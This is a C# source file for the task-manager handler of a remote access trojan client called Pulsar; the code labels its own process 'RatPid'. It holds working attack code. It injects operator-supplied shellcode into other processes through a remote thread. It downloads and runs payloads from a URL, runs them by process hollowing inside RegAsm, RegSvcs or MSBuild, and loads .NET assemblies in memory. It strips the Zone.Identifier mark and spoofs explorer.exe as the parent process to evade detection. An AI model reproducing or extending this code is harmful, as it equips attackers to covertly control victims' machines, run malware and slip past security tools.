using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.Helper;
using Pulsar.Common;
using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Threading;
using static Pulsar.Client.Utilities.NativeMethods;
using System.Runtime.InteropServices;
using SIZE_T = System.UIntPtr;

namespace Pulsar.Client.Messages
{
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly PulsarClient _client;
        private readonly WebClient _webClient;

        public TaskManagerHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadDataCompleted += OnDownloadDataCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected && _webClient.IsBusy) _webClient.CancelAsync();
        }

        public bool CanExecute(IMessage message) =>
            message is GetProcesses ||
            message is DoProcessStart ||
            message is DoProcessEnd ||
            message is DoProcessDump ||
            message is DoSetTopMost ||
            message is DoSuspendProcess ||
            message is DoSetWindowState ||
            message is DoInjectShellcodeIntoProcess; // Add this line

        public bool CanExecuteFrom(ISender sender) => true;

        private void SendStatus(string message)
        {
            try { _client.Send(new SetStatus { Message = message }); }
            catch { }
        }

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg: Execute(sender, msg); break;
                case DoProcessStart msg: Execute(sender, msg); break;
                case DoProcessEnd msg: Execute(sender, msg); break;
                case DoProcessDump msg: Execute(sender, msg); break;
                case DoSuspendProcess msg: Execute(sender, msg); break;
                case DoSetTopMost msg: Execute(sender, msg); break;
                case DoSetWindowState msg: Execute(sender, msg); break;
                case DoInjectShellcodeIntoProcess msg: Execute(sender, msg); break; // Add this line
            }
        }

        private bool InjectShellcodeIntoProcess(Process targetProcess, byte[] shellcode)
        {
            IntPtr processHandle = IntPtr.Zero;
            IntPtr allocatedMemory = IntPtr.Zero;
            IntPtr threadHandle = IntPtr.Zero;

            try
            {
                // Open the target process with necessary permissions
                processHandle = Utilities.NativeMethods.OpenProcess(
                    Utilities.NativeMethods.ProcessAccessFlags.VM_OPERATION |
                    Utilities.NativeMethods.ProcessAccessFlags.VM_WRITE |
                    Utilities.NativeMethods.ProcessAccessFlags.CREATE_THREAD |
                    Utilities.NativeMethods.ProcessAccessFlags.QUERY_INFORMATION,
                    false, (uint)targetProcess.Id);

                if (processHandle == IntPtr.Zero)
                {
                    SendStatus($"Failed to open process handle (Error: {Marshal.GetLastWin32Error()})");
                    return false;
                }

                // Allocate memory in the target process
                allocatedMemory = Utilities.NativeMethods.VirtualAllocEx(
                    processHandle,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Utilities.NativeMethods.AllocationType.Commit | Utilities.NativeMethods.AllocationType.Reserve,
                    Utilities.NativeMethods.MemoryProtection.ExecuteReadWrite);

                if (allocatedMemory == IntPtr.Zero)
                {
                    SendStatus($"Failed to allocate memory in target process (Error: {Marshal.GetLastWin32Error()})");
                    return false;
                }

                // Write shellcode to allocated memory
                bool writeSuccess = Utilities.NativeMethods.WriteProcessMemory(
                    processHandle,
                    allocatedMemory,
                    shellcode,
                    (uint)shellcode.Length,
                    out _);

                if (!writeSuccess)
                {
                    SendStatus($"Failed to write shellcode to target process (Error: {Marshal.GetLastWin32Error()})");
                    return false;
                }

                // Create remote thread to execute the shellcode
                threadHandle = Utilities.NativeMethods.CreateRemoteThread(
                    processHandle,
                    IntPtr.Zero,
                    0,
                    allocatedMemory,
                    IntPtr.Zero,
                    0,
                    out _);

                if (threadHandle == IntPtr.Zero)
                {
                    SendStatus($"Failed to create remote thread (Error: {Marshal.GetLastWin32Error()})");
                    return false;
                }

                // Wait for thread to complete (optional - you might want to remove this for async execution)
                Utilities.NativeMethods.WaitForSingleObject(threadHandle, 0xFFFFFFFF);

                return true;
            }
            catch (Exception ex)
            {
                SendStatus($"Injection error: {ex.Message}");
                return false;
            }
            finally
            {
                // Clean up handles
                if (threadHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(threadHandle);
                if (allocatedMemory != IntPtr.Zero) Utilities.NativeMethods.VirtualFreeEx(processHandle, allocatedMemory, 0, Utilities.NativeMethods.FreeType.Release);
                if (processHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(processHandle);
            }
        }
        private void Execute(ISender client, DoInjectShellcodeIntoProcess message)
        {
            try
            {
                SendStatus($"Injecting shellcode into process PID: {message.ProcessId}");

                if (message.Shellcode == null || message.Shellcode.Length == 0)
                {
                    SendStatus("Shellcode injection failed: Empty shellcode");
                    return;
                }

                Process targetProcess = Process.GetProcessById(message.ProcessId);
                if (targetProcess == null)
                {
                    SendStatus($"Shellcode injection failed: Process PID {message.ProcessId} not found");
                    return;
                }

                // Perform the injection
                bool success = InjectShellcodeIntoProcess(targetProcess, message.Shellcode);

                if (success)
                {
                    SendStatus($"Shellcode successfully injected into PID {message.ProcessId} ({targetProcess.ProcessName})");
                }
                else
                {
                    SendStatus($"Shellcode injection failed for PID {message.ProcessId}");
                }
            }
            catch (Exception ex)
            {
                SendStatus($"Shellcode injection error for PID {message.ProcessId}: {ex.Message}");
            }
        }
        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    proc.Kill();
                    client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
                    SendStatus($"Process PID {message.Pid} ({proc.ProcessName}) successfully terminated");
                }
                else
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                    SendStatus($"Kill failed: PID {message.Pid} not found");
                }
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                // Happens when user lacks privileges to terminate the process
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                SendStatus($"Kill failed for PID {message.Pid}: Access denied (admin privileges required). {ex.Message}");
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                SendStatus($"Kill failed for PID {message.Pid}: {ex.Message}");
            }
        }

        // ---------------------- WINDOW HANDLERS ----------------------
        private void Execute(ISender client, DoSuspendProcess message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    if (message.Suspend)
                        Utilities.NativeMethods.NtSuspendProcess(proc.Handle);
                    else
                        Utilities.NativeMethods.NtResumeProcess(proc.Handle); // <--- process-level resume

                    client.Send(new DoProcessResponse
                    {
                        Action = ProcessAction.Suspend,
                        Result = true
                    });

                    SendStatus($"Process PID {message.Pid} {(message.Suspend ? "suspended" : "resumed")}");
                }
                else
                {
                    client.Send(new DoProcessResponse
                    {
                        Action = ProcessAction.Suspend,
                        Result = false
                    });

                    SendStatus($"Process PID {message.Pid} not found");
                }
            }
            catch
            {
                client.Send(new DoProcessResponse
                {
                    Action = ProcessAction.Suspend,
                    Result = false
                });

                SendStatus($"Failed to {(message.Suspend ? "suspend" : "resume")} PID {message.Pid}");
            }
        }



        private void Execute(ISender client, DoSetWindowState message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                    SendStatus($"SetWindowState failed: PID {message.Pid} not found or has no main window");
                    return;
                }

                int nCmd = message.Minimize ? 6 : 9;
                bool result = Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, nCmd);

                if (result)
                    SendStatus($"Window {(message.Minimize ? "minimized" : "restored")} for PID {message.Pid}");
                else
                    SendStatus($"SetWindowState failed for PID {message.Pid}: Access denied or higher privilege required");

                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = result });
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                SendStatus($"SetWindowState failed for PID {message.Pid}: {ex.Message}");
            }
        }

        private void Execute(ISender client, DoSetTopMost message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                    SendStatus($"SetTopMost failed: PID {message.Pid} not found or has no main window");
                    return;
                }

                const int HWND_TOPMOST = -1;
                const int HWND_NOTOPMOST = -2;
                const uint SWP_NOSIZE = 0x0001;
                const uint SWP_NOMOVE = 0x0002;
                const uint SWP_SHOWWINDOW = 0x0040;

                Utilities.NativeMethods.SetForegroundWindow(proc.MainWindowHandle);
                if (Utilities.NativeMethods.IsIconic(proc.MainWindowHandle))
                    Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, 9);

                IntPtr hWndInsertAfter = new IntPtr(message.Enable ? HWND_TOPMOST : HWND_NOTOPMOST);
                bool result = Utilities.NativeMethods.SetWindowPos(
                    proc.MainWindowHandle,
                    hWndInsertAfter,
                    0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                );

                if (result)
                    SendStatus($"TopMost {(message.Enable ? "enabled" : "disabled")} for PID {message.Pid}");
                else
                    SendStatus($"SetTopMost failed for PID {message.Pid}: Access denied or higher privilege required");

                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = result });
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                SendStatus($"SetTopMost failed for PID {message.Pid}: {ex.Message}");
            }
        }

        // ---------------------- PROCESS HANDLERS ----------------------

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];
            var parentMap = GetParentProcessMap();

            for (int i = 0; i < pList.Length; i++)
            {
                processes[i] = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle,
                    ParentId = parentMap.TryGetValue(pList[i].Id, out var parentId) ? parentId : null
                };
            }

            int currentPid = Process.GetCurrentProcess().Id;
            client.Send(new GetProcessesResponse { Processes = processes, RatPid = currentPid });
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            SendStatus($"Starting process: {message.FilePath ?? message.DownloadUrl}");

            if (string.IsNullOrEmpty(message.FilePath) && (message.FileBytes == null || message.FileBytes.Length == 0))
            {
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("Process start failed: No file path or download URL");
                    return;
                }

                try
                {
                    if (_webClient.IsBusy) { _webClient.CancelAsync(); while (_webClient.IsBusy) Thread.Sleep(50); }
                    _webClient.DownloadDataAsync(new Uri(message.DownloadUrl), message);
                }
                catch
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("Process start failed: Download error");
                }
            }
            else
            {
                ExecuteProcess(
                    message.FileBytes,
                    message.FilePath,
                    message.IsUpdate,
                    message.ExecuteInMemoryDotNet,
                    message.UseRunPE,
                    message.RunPETarget,
                    message.RunPECustomPath,
                    message.FileExtension,
                    message.IsFromFileManager   // <<< NEW
                );
            }
        }

        private void OnDownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            var message = (DoProcessStart)e.UserState;
            if (e.Cancelled || e.Error != null)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Process start failed: Download cancelled or error");
                return;
            }
            ExecuteProcess(
                message.FileBytes,
                message.FilePath,
                message.IsUpdate,
                message.ExecuteInMemoryDotNet,
                message.UseRunPE,
                message.RunPETarget,
                message.RunPECustomPath,
                message.FileExtension,
                message.IsFromFileManager   // <<< NEW
            );
        }

        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory,
            bool useRunPE, string runPETarget, string runPECustomPath, string fileExtension, bool isFromFileManager)
        {
            // ------------------------------------------------------------
            // 1. FILE MANAGER NORMAL EXECUTION (NO BYTES, NO TEMP, NO POLICY)
            // ------------------------------------------------------------
            if (isFromFileManager && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = filePath,
                        UseShellExecute = true
                    });

                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                    SendStatus($"Executed normally (File Manager): {filePath}");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($"Normal execution failed: {ex.Message}");
                }

                return;
            }

            // ------------------------------------------------------------
            // 2. REMOTE EXECUTION LOGIC (UPLOAD EXECUTION)
            // ------------------------------------------------------------
            if (fileBytes == null && filePath != null && File.Exists(filePath))
                fileBytes = File.ReadAllBytes(filePath);

            if (fileBytes == null || fileBytes.Length == 0)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Process start failed: no file bytes available");
                return;
            }

            try
            {
                if (useRunPE)
                {
                    ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath);
                    return;
                }

                if (executeInMemory)
                {
                    ExecuteViaInMemoryDotNet(fileBytes);
                    return;
                }

                // default remote execution
                ExecuteViaTemporaryFile(fileBytes, fileExtension);
            }
            catch (Exception ex)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus($"Process start failed: {ex.Message}");
            }
        }

        private void ExecuteViaRunPE(byte[] fileBytes, string runPETarget, string runPECustomPath)
        {
            new Thread(() =>
            {
                try
                {
                    bool result = Helper.RunPE.Execute(GetRunPEHostPath(runPETarget, runPECustomPath, IsPayload64Bit(fileBytes)), fileBytes);
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = result });
                    SendStatus($"RunPE execution {(result ? "succeeded" : "failed")}");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($"RunPE failed: {ex.Message}");
                }
            }).Start();
        }

        private void ExecuteViaInMemoryDotNet(byte[] fileBytes)
        {
            new Thread(() =>
            {
                try
                {
                    Assembly asm = Assembly.Load(fileBytes);
                    MethodInfo entry = asm.EntryPoint;
                    if (entry != null)
                        entry.Invoke(null, entry.GetParameters().Length == 0 ? null : new object[] { new string[0] });
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                    SendStatus(".NET in-memory execution succeeded");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($".NET in-memory execution failed: {ex.Message}");
                }
            }).Start();
        }


        private void ExecuteViaTemporaryFile(byte[] fileBytes, string fileExtension)
        {
            try
            {
                string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                File.WriteAllBytes(tempPath, fileBytes);
                FileHelper.DeleteZoneIdentifier(tempPath);

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                // USE NATIVE METHODS VERSION STRICTLY
                var si = new Utilities.NativeMethods.STARTUPINFOEX();
                si.StartupInfo.cb = Marshal.SizeOf(typeof(Utilities.NativeMethods.STARTUPINFOEX));

                // Get explorer.exe PID and directory for spoofing
                var (parentPid, parentDirectory) = GetExplorerPidAndDirectory();
                SendStatus($"Using PPID spoofing with parent: {parentPid}");
                SendStatus($"Using directory: {parentDirectory}");

                // ---- ATTRIBUTE LIST ----
                IntPtr attrSize = IntPtr.Zero;

                // First call retrieves required bytes (2 attributes: PPID + mitigation)
                Utilities.NativeMethods.InitializeProcThreadAttributeList(
                    IntPtr.Zero, 2, 0, ref attrSize);

                si.lpAttributeList = Marshal.AllocHGlobal(attrSize);

                if (!Utilities.NativeMethods.InitializeProcThreadAttributeList(
                    si.lpAttributeList, 2, 0, ref attrSize))
                {
                    throw new Exception("InitializeProcThreadAttributeList failed.");
                }

                IntPtr parentProcessHandle = IntPtr.Zero;
                IntPtr lpValueProc = IntPtr.Zero;

                try
                {
                    // Set PPID spoofing
                    parentProcessHandle = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, parentPid);
                    if (parentProcessHandle == IntPtr.Zero)
                    {
                        int error = Marshal.GetLastWin32Error();
                        throw new Exception($"OpenProcess failed for PPID: 0x{error:X8}");
                    }

                    lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValueProc, parentProcessHandle);

                    // Update attribute for PPID spoofing
                    ulong ppidValue = (ulong)parentProcessHandle.ToInt64();
                    if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
                        si.lpAttributeList,
                        0,
                        (IntPtr)0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
                        ref ppidValue,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero))
                    {
                        int error = Marshal.GetLastWin32Error();
                        throw new Exception($"UpdateProcThreadAttribute (PPID) failed: 0x{error:X8}");
                    }

                    // Set block non-Microsoft DLLs policy
                    ulong policy = Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

                    if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
                        si.lpAttributeList,
                        0,
                        Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        ref policy,
                        (IntPtr)sizeof(ulong),
                        IntPtr.Zero,
                        IntPtr.Zero))
                    {
                        throw new Exception("UpdateProcThreadAttribute (Mitigation) failed.");
                    }

                    // ---- CREATE PROCESS ----
                    bool ok = Utilities.NativeMethods.CreateProcess(
                        null,
                        $"\"{tempPath}\"", // Quote the path in case of spaces
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        Utilities.NativeMethods.EXTENDED_STARTUPINFO_PRESENT,
                        IntPtr.Zero,
                        parentDirectory, // Use explorer.exe directory for spoofing
                        ref si,
                        out pi
                    );

                    if (ok)
                    {
                        Utilities.NativeMethods.CloseHandle(pi.hProcess);
                        Utilities.NativeMethods.CloseHandle(pi.hThread);

                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                        SendStatus($"Process executed with PPID spoofing and mitigation policy (PID: {pi.dwProcessId})");
                    }
                    else
                    {
                        // Fallback without spoofing
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = tempPath,
                            UseShellExecute = true,
                            WorkingDirectory = parentDirectory
                        });

                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                        SendStatus("Executed via fallback Process.Start()");
                    }
                }
                finally
                {
                    // Cleanup
                    if (si.lpAttributeList != IntPtr.Zero)
                    {
                        Utilities.NativeMethods.DeleteProcThreadAttributeList(si.lpAttributeList);
                        Marshal.FreeHGlobal(si.lpAttributeList);
                    }
                    if (lpValueProc != IntPtr.Zero) Marshal.FreeHGlobal(lpValueProc);
                    if (parentProcessHandle != IntPtr.Zero) CloseHandle(parentProcessHandle);
                }
            }
            catch (Exception ex)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Temporary file execution failed: " + ex.Message);
            }
        }

        // Add these missing methods and enums to your class
        private (uint pid, string directory) GetExplorerPidAndDirectory()
        {
            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
            if (explorerProcesses.Length > 0)
            {
                var explorer = explorerProcesses[0];
                string directory;

                try
                {
                    // Try to get the actual working directory of explorer.exe
                    directory = Path.GetDirectoryName(explorer.MainModule.FileName);
                    if (string.IsNullOrEmpty(directory))
                    {
                        // Fallback to Windows directory
                        directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                    }
                }
                catch
                {
                    // Fallback to Windows directory if we can't access the process
                    directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                }

                return ((uint)explorer.Id, directory);
            }
            throw new Exception("No explorer.exe process found for PPID spoofing");
        }

        // Add these P/Invoke declarations to your NativeMethods class or use existing ones
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [Flags]
        private enum ProcessAccessFlags : uint
        {
            PROCESS_CREATE_PROCESS = 0x0080,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_READ = 0x0010
        }
        private Dictionary<int, int?> GetParentProcessMap()
        {
            var map = new Dictionary<int, int?>();
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, ParentProcessId FROM Win32_Process"))
                using (var results = searcher.Get())
                {
                    foreach (ManagementObject obj in results)
                    {
                        int pid = Convert.ToInt32(obj["ProcessId"]);
                        int? parent = obj["ParentProcessId"] != null ? Convert.ToInt32(obj["ParentProcessId"]) : (int?)null;
                        map[pid] = parent != pid ? parent : null;
                    }
                }
            }
            catch { }
            return map;
        }

        private bool IsPayload64Bit(byte[] payload)
        {
            try
            {
                if (payload.Length < 0x40 || payload[0] != 'M' || payload[1] != 'Z') return false;
                int peOffset = BitConverter.ToInt32(payload, 0x3C);
                return BitConverter.ToUInt16(payload, peOffset + 4) == 0x8664;
            }
            catch { return false; }
        }

        private string GetRunPEHostPath(string target, string customPath, bool is64)
        {
            string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string frameworkDir = is64
                ? Path.Combine(winDir, "Microsoft.NET", "Framework64", "v4.0.30319")
                : Path.Combine(winDir, "Microsoft.NET", "Framework", "v4.0.30319");

            if (!Directory.Exists(frameworkDir))
                frameworkDir = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory();

            switch (target)
            {
                case "a":
                    return Path.Combine(frameworkDir, "RegAsm.exe");
                case "b":
                    return Path.Combine(frameworkDir, "RegSvcs.exe");
                case "c":
                    return Path.Combine(frameworkDir, "MSBuild.exe");
                case "d":
                    return customPath;
                default:
                    return Path.Combine(frameworkDir, "RegAsm.exe");
            }
        }


        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadDataCompleted -= OnDownloadDataCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
